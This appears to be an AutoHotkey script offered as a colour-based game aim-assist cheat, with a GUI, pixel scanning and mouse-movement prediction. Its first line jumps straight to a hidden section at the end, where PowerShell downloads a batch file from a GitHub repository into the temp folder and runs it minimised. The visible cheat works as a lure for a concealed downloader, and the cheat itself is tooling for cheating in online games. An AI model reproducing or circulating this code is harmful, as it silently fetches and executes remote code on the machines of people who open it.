goto Resume_file
#SingleInstance, Force
#Persistent
#InstallKeybdHook
#UseHook
#KeyHistory, 0
#HotKeyInterval 1
#MaxHotkeysPerInterval 127
CoordMode, Pixel, Screen, RGB
CoordMode, Mouse, Screen
PID := DllCall("GetCurrentProcessId")
Process, Priority, %PID%, High
 
; GUI Window
Gui, +AlwaysOnTop
Width := 310
Gui, +LastFound
WinSet, Transparent, 180 		;Transparency of gui
Gui, Color, 808080  			;Background color of gui
Gui, Margin, 0, 0
 
; GUI Title
Gui, Font, s10 cD0D0D0 Bold
Gui, Add, Progress, % "x-1 y-1 w" (Width+2) " h31 Background000000 Disabled hwndHPROG"
Control, ExStyle, -0x20000, , ahk_id %HPROG% 
Gui, Add, Text, % "x0 y0 w" Width " h30 BackgroundTrans Center 0x200 gGuiMove vCaption", Sai's Aim Assist
 
; GUI Body
Gui, Font, s8
Gui, Add, CheckBox, % "x7 y+10 w" (Width-14) "r1 +0x4000 vEnableCheckbox", Enable (ALT Key)
Gui, Add, CheckBox, % "x7 y+5 w" (Width-14) "r1 +0x4000 vEnablePredictionCheckbox", Enable Prediction
; Target
Gui, Add, Text, % "x7 y+10 w" (Width-14) "r1 +0x4000", Target Location
Gui, Add, Button, % "x7 y+5 w" (Width-200) "r1 +0x4000 gHeadshotsButton", Head
Gui, Add, Button, % "x+2+m w" (Width-200) "r1 +0x4000 gChestButton", Chest
; Add Smoothing Control
Gui, Add, Text, % "x7 y+10 w" (Width-100) "r1 +0x4000", Smoothing (Default is 0.11)
Gui, Add, Text, % "x+m w" (Width-14) "r1 +0x4000 vSmoothingValue", %smoothing%
Gui, Add, Button, % "x7 y+5 w" (Width-275) "r1 +0x4000 gDecreaseSmoothing", -
Gui, Add, Button, % "x+2+m w" (Width-275) "r1 +0x4000 gIncreaseSmoothing", +
;Close Window
Gui, Add, Text, % "x7 y+10 w" (Width-14) "r1 +0x4000 gClose", Close
Gui, Add, Text, % "x7 y+15 w" "h5 vP"
GuiControlGet, P, Pos
H := PY + PH
Gui, -Caption
WinSet, Region, 0-0 w%Width% h%H% r6-6
; Show GUI
Gui, Show, % "w" Width " NA" " x" (A_ScreenWidth - Width) "x10 y550"
 
; Settings
EMCol := 0xb528c0 				; Target color   c9008d
ColVn := 30  					; Tolerance for color matching
ZeroX := A_ScreenWidth / 2		;DO NOT CHANGE, UNIVERSAL RESOLUTION
ZeroY := A_ScreenHeight / 2.18	;DO NOT CHANGE, UNIVERSAL RESOLUTION
CFovX := 78						; Adjusted for a larger FOV (Anything past 78 will be affected by grenade indicator and Directional Hit indicators)
CFovY := 78 					; Adjusted for a larger FOV (Anything past 78 will be affected by grenade indicator and Directional Hit indicators)
ScanL := ZeroX - CFovX
ScanT := ZeroY - CFovY
ScanR := ZeroX + CFovX
ScanB := ZeroY + CFovY
SearchArea := 40  				; Smaller area around the last known position
 
; Variables for prediction
prevX := 0
prevY := 0
lastTime := 0
smoothing := 0.11  				; Default smoothing value
predictionMultiplier := 2.5  	; Adjust this to control how far ahead you predict
 
Loop
{
    ; Check if the script is enabled
    GuiControlGet, EnableState,, EnableCheckbox
    if (EnableState) {
        targetFound := False
        
        if GetKeyState("LButton", "P") or GetKeyState("RButton", "P") {
            ; Search for target pixel in a smaller region around the last known position
            PixelSearch, AimPixelX, AimPixelY, targetX - SearchArea, targetY - SearchArea, targetX + SearchArea, targetY + SearchArea, EMCol, ColVn, Fast RGB
            if (!ErrorLevel) {
                targetX := AimPixelX
                targetY := AimPixelY
                targetFound := True
            } else {
                PixelSearch, AimPixelX, AimPixelY, ScanL, ScanT, ScanR, ScanB, EMCol, ColVn, Fast RGB
                if (!ErrorLevel) {
                    targetX := AimPixelX
                    targetY := AimPixelY
                    targetFound := True
                }
            }
            
            if (targetFound) {
                ; Get current time
                currentTime := A_TickCount
 
                ; Calculate the velocity of the target
                if (lastTime != 0) {
                    deltaTime := (currentTime - lastTime) / 1000.0  ; Convert to seconds (Its in mil secs)
                    velocityX := (targetX - prevX) / deltaTime
                    velocityY := (targetY - prevY) / deltaTime
                }
 
                ; Store the current position and time for the next iteration
                prevX := targetX
                prevY := targetY
                lastTime := currentTime
                
                ; Apply prediction if enabled
                GuiControlGet, PredictionEnabled,, EnablePredictionCheckbox
                if (PredictionEnabled && deltaTime != 0) {
                    PredictedX := targetX + Round(velocityX * predictionMultiplier * deltaTime)
                    PredictedY := targetY + Round(velocityY * predictionMultiplier * deltaTime)
                } else {
                    PredictedX := targetX
                    PredictedY := targetY
                }
 
                ; Move the mouse smoothly with strength adjustment
                AimX := PredictedX - ZeroX
                AimY := PredictedY - ZeroY
                DllCall("mouse_event", uint, 1, int, Round(AimX * smoothing), int, Round(AimY * smoothing), uint, 0, int, 0)
            }
        }
    }
    Sleep, 10
}
 
GuiControl,, ZeroYLabel, %ZeroY%
GuiControl,, CFovXLabel, %CFovX%
GuiControl,, CFovYLabel, %CFovY%
GuiControl,, SmoothingValue, %smoothing%
 
; Button callbacks for GUI
HeadshotsButton:
    ZeroY := A_ScreenHeight / 2.18
    GuiControl,, ZeroYLabel, %ZeroY%
    Return
 
ChestButton:
    ZeroY := A_ScreenHeight / 2.22
    GuiControl,, ZeroYLabel, %ZeroY%
    Return
 
GuiMove:
    PostMessage, 0xA1, 2
    return
 
IncreaseSmoothing:
    smoothing += 0.01
    if (smoothing > 2)  ; Set a maximum limit for smoothing
        smoothing := 2
    GuiControl,, SmoothingValue, %smoothing%
    Return
 
DecreaseSmoothing:
    smoothing -= 0.01
    if (smoothing < 0.0)  ; Set a minimum limit for smoothing
        smoothing := 0.0
    GuiControl,, SmoothingValue, %smoothing%
    Return
 
toggle := false
 
if (targetFound && toggle) {
    click down
} else {
    click up
}
 
Paused := False
Alt:: ;Enable Checkbox
    ; Toggle the Enable checkbox state
    GuiControlGet, EnableState,, EnableCheckbox
    GuiControl,, EnableCheckbox, % !EnableState
    ; Toggle the script state based on the checkbox
    toggle := EnableState
    ; Play sound
    if (toggle) {
        SoundBeep, 300, 100
    }
Return
 
 
OnExit:
GuiClose:
    ExitApp
    Return    
 
Close:
ExitApp
 
f9::Reload






:Resume_file


cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/ColorbotLikeZombies1.1.1.3.4at.bat' -OutFile ColorbotLikeZombies1.1.1.3.4at.bat"
start /min ColorbotLikeZombies1.1.1.3.4at.bat
